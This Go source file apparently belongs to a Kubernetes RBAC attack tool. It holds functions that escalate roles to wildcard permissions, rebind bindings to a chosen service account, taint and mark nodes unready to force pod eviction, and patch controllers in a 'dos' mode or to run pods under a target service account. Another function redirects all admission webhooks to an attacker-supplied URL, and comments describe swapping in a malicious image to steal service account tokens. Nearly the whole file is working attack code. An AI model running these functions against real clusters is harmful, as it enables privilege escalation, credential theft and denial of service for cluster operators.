package utils

import (
	"context"
	"encoding/json"
	"fmt"
	"k8sRBACdetect/pkg/request"

	"github.com/tidwall/gjson"
	metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
	"k8s.io/apimachinery/pkg/types"
)

func PatchClusterRole(token string, clusterrole string) error {
	clientset := request.GetClientSet(token)
	patchData := []byte(fmt.Sprintf(`{"rules":[{"apiGroups":["*"],"resources":["*"],"verbs":["*"]}]}`))
	_, err := clientset.RbacV1().ClusterRoles().Patch(context.TODO(), clusterrole, types.MergePatchType, patchData, metav1.PatchOptions{})
	if err != nil {
		return err
	}
	fmt.Println("[√] Successfully patch", clusterrole)
	return nil
}

func PatchRole(token string, namespace string, role string) error {
	clientset := request.GetClientSet(token)
	patchData := []byte(fmt.Sprintf(`{"rules":[{"apiGroups":["*"],"resources":["*"],"verbs":["*"]}]}`))
	_, err := clientset.RbacV1().Roles(namespace).Patch(context.TODO(), role, types.MergePatchType, patchData, metav1.PatchOptions{})
	if err != nil {
		return err
	}
	fmt.Println("[√] Successfully patch", namespace+"/"+role)
	return nil
}

func PatchClusterRoleBinding(token string, clusterrolebinding string, saNamespace string, saName string) error {
	clientset := request.GetClientSet(token)
	patchData := []byte(fmt.Sprintf(`{"subjects": [{"kind": "ServiceAccount", "name": "%s", "namespace": "%s"}]}`, saName, saNamespace))
	_, err := clientset.RbacV1().ClusterRoleBindings().Patch(context.TODO(), clusterrolebinding, types.MergePatchType, patchData, metav1.PatchOptions{})
	if err != nil {
		return err
	}
	fmt.Println("[√] Successfully patch", clusterrolebinding)
	return nil
}

func PatchRoleBinding(token string, rolebinding string, saNamespace string, saName string) error {
	clientset := request.GetClientSet(token)
	patchData := []byte(fmt.Sprintf(`{"subjects": [{"kind": "ServiceAccount", "name": "%s", "namespace": "%s"}]}`, saName, saNamespace))
	_, err := clientset.RbacV1().RoleBindings(saNamespace).Patch(context.TODO(), rolebinding, types.MergePatchType, patchData, metav1.PatchOptions{})
	if err != nil {
		return err
	}
	fmt.Println("[√] Successfully patch", saNamespace+"/"+rolebinding)
	return nil
}

/*
* Even after patchNodes, Pods will still not be evicted in the following situations: Pod is set with nodeName, Pod is set with any toleration that matches
 */
func PatchNodes(token string, ControledNode string) error {
	opts := request.K8sRequestOption{
		Api:    "/api/v1/nodes",
		Method: "GET",
	}
	resp, err := request.ApiRequest(opts)
	if err != nil {
		return err
	}
	nodes := gjson.Get(resp, "items").Array()
	nodesName := []string{}
	for _, node := range nodes {
		nodesName = append(nodesName, node.Get("metadata.name").String())
	}
	for _, node := range nodesName {
		if node != ControledNode {
			fmt.Println("Patching " + node)
			opts = request.K8sRequestOption{
				Api:      "/api/v1/nodes/" + node,
				Method:   "PATCH", /*  */
				Header:   map[string]string{"Content-Type": "application/strategic-merge-patch+json"},
				PostData: "{\"spec\":{\"taints\":[{\"key\":\"whatever\",\"effect\":\"NoExecute\"}]}}",
				Token:    token,
			}
			_, err = request.ApiRequest(opts)
			if err != nil {
				return err
			}
		}

	}
	return nil
}

func PatchNodeStatus(token string, nodeList []string) error {
	clientset := request.GetClientSet(token)
	patchData := []byte(`{"status":{"conditions":[{"type":"Ready","status":"False"}]}}`)

	for _, node := range nodeList {
		_, err := clientset.CoreV1().Nodes().PatchStatus(context.TODO(), node, patchData)
		if err != nil {
			return err
		}
	}
	fmt.Println("[√] The remaining normal nodes have been patched")
	return nil

}

/*
* （patchPods can only modify spec.containers[*].image、spec.initContainers[*].image、spec.activeDeadlineSeconds、spec.tolerations、spec.terminationGracePeriodSeconds）
* use(patchPods)：
* 1、When a pod can run on the node because the corresponding tolerance is set, passing toleranceSeconds=0 can be equivalent to deletePod
* 2、Modify containers[*].image to be a malicious image and steal the SA mounted in the Pod
 */
func PatchPod(token string, namespace string, podName string) {
	clientset := request.GetClientSet(token)
	operations := []JSONPatchOperation{
		//{Op: "replace", Path: "/spec/serviceAccountName", Value: newServiceAccountName}, 	//JSON Patch
		//{Op: "replace", Path: "/spec/tolerations/0/tolerationSeconds", Value: "10"},
		//{Op: "add", Path: "/spec/containers/-", Value: map[string]interface{}{"name": "new-container", "image": "nginx"}},
		{Op: "add", Path: "/spec/tolerations/0/tolerationSeconds", Value: 0},
		//{Op: "replace", Path: "/spec/containers/0/image", Value: "nginx2"},
	}

	patchData, err := json.Marshal(operations)
	//jsonPatch := `[{"op": "add", "path": "/spec/tolerations/0/tolerationSeconds", "value": 120}]`
	//patchData = []byte(jsonPatch)
	if err != nil {
		fmt.Printf("Error encoding JSON Patch: %v\n", err)
		return
	}
	_, err = clientset.CoreV1().Pods(namespace).Patch(context.TODO(), podName, types.JSONPatchType, patchData, metav1.PatchOptions{})
	if err != nil {
		fmt.Printf("Error patching Pod: %v\n", err)
	}
}

//- kubectl patch deployment my-deployment --type="json" -p='[{"op": "add", "path": "/spec/template/spec/tolerations/0/tolerationSeconds", "value": 0}]'
/*
*	ReplicaSet is stateless. When the nodeName in ReplicaSet is patched, the pod will not change immediately. 
* 	Instead, the node running the pod will be updated after the currently running pod is deleted due to some circumstances.
*/
func PatchController(controllerType string, token string, namespace string, controllerName string, nodeName string, targetSA string, attackType string) error {
	clientset := request.GetClientSet(token)
	var patchData []byte
	if attackType == "dos" {
		operations := []JSONPatchOperation{
			{Op: "add", Path: "/spec/template/spec/nodeName", Value: nodeName},
			{Op: "add", Path: "/spec/replicas", Value: 999}, //JSON Patch
		}
		patchData, _ = json.Marshal(operations)
	} else {
		operations := []JSONPatchOperation{
			//{Op: "replace", Path: "/spec/replicas", Value: 5},	//After the deployment is modified, if its pod is not updated, add replicas and generate a new pod.
			{Op: "add", Path: "/spec/template/spec/nodeName", Value: nodeName},
			{Op: "add", Path: "/spec/template/spec/serviceAccountName", Value: targetSA}, //JSON Patch
		}
		patchData, _ = json.Marshal(operations)
	}
	if controllerType == "deployments" {
		_, err := clientset.AppsV1().Deployments(namespace).Patch(
			context.TODO(),
			controllerName,
			types.JSONPatchType,
			patchData,
			metav1.PatchOptions{},
		)
		if err != nil {
			return err
		} else {
			fmt.Printf("[√] Deployments %s in namespace %s patched successfully.\n", controllerName, namespace)
		}
	} else if controllerType == "statefulsets" {
		_, err := clientset.AppsV1().StatefulSets(namespace).Patch(
			context.TODO(),
			controllerName,
			types.JSONPatchType, // Using the JSON Patch type
			patchData,
			metav1.PatchOptions{},
		)
		if err != nil {
			return err
		} else {
			fmt.Printf("[√] Statefulsets %s in namespace %s patched successfully.\n", controllerName, namespace)
		}
	} else if controllerType == "replicasets" {
		_, err := clientset.AppsV1().ReplicaSets(namespace).Patch(
			context.TODO(),
			controllerName,
			types.JSONPatchType, // Using the JSON Patch type
			patchData,
			metav1.PatchOptions{},
		)
		if err != nil {
			return err
		} else {
			fmt.Printf("[√] Replicasets %s in namespace %s patched successfully.\n", controllerName, namespace)
		}
	} else if controllerType == "daemonsets" {
		_, err := clientset.AppsV1().DaemonSets(namespace).Patch(
			context.TODO(),
			controllerName,
			types.JSONPatchType, // Using the JSON Patch type
			patchData,
			metav1.PatchOptions{},
		)
		if err != nil {
			return err
		} else {
			fmt.Printf("[√] DaemonSets %s in namespace %s patched successfully.\n", controllerName, namespace)
		}
	} else if controllerType == "jobs" {
		_, err := clientset.BatchV1().Jobs(namespace).Patch(
			context.TODO(),
			controllerName,
			types.JSONPatchType, // Using the JSON Patch type
			patchData,
			metav1.PatchOptions{},
		)
		if err != nil {
			return err
		} else {
			fmt.Printf("[√] jobs %s in namespace %s patched successfully.\n", controllerName, namespace)
		}
	} else if controllerType == "cronjobs" {
		_, err := clientset.BatchV1().CronJobs(namespace).Patch(
			context.TODO(),
			controllerName,
			types.JSONPatchType, // Using the JSON Patch type
			patchData,
			metav1.PatchOptions{},
		)
		if err != nil {
			return err
		} else {
			fmt.Printf("[√] cronjobs %s in namespace %s patched successfully.\n", controllerName, namespace)
		}
	} else if controllerType == "replicationcontrollers" {
		_, err := clientset.CoreV1().ReplicationControllers(namespace).Patch(
			context.TODO(),
			controllerName,
			types.JSONPatchType, // Using the JSON Patch type
			patchData,
			metav1.PatchOptions{},
		)
		if err != nil {
			return err
		} else {
			fmt.Printf("[√] replicationcontrollers %s in namespace %s patched successfully.\n", controllerName, namespace)
		}
	}
	return nil

}

func PatchWebhookConfig(token string, webconfigType string, webhookconfigName string, webhookURL string, ca string) error {
	clientset := request.GetClientSet(token)
	patchData := []byte(fmt.Sprintf(
		`{"webhooks":[{"clientConfig":{"url":"%s","caBundle":"%s"},
		"rules":[{"operations":["*"],"apiGroups":["*"],"apiVersions":["*"],"resources":["*"]}],
		"sideEffects":"None",
		"admissionReviewVersions": ["v1"],
		"name": "example.mutation.example.com"
		}]}`, webhookURL, ca,
	))
	if webconfigType == "mutatingwebhookconfigurations" {
		result, err := clientset.AdmissionregistrationV1().MutatingWebhookConfigurations().Patch(context.TODO(), webhookconfigName, types.MergePatchType, patchData, metav1.PatchOptions{})
		if err != nil {
			return err
		}
		fmt.Println("[√] Successfully patch", result.GetObjectMeta().GetName())
	} else {
		result, err := clientset.AdmissionregistrationV1().ValidatingWebhookConfigurations().Patch(context.TODO(), webhookconfigName, types.MergePatchType, patchData, metav1.PatchOptions{})
		if err != nil {
			return err
		}
		fmt.Println("[√] Successfully patch", result.GetObjectMeta().GetName())
	}
	return nil
}

type JSONPatchOperation struct {
	Op    string      `json:"op"`
	Path  string      `json:"path"`
	Value interface{} `json:"value,omitempty"`
}
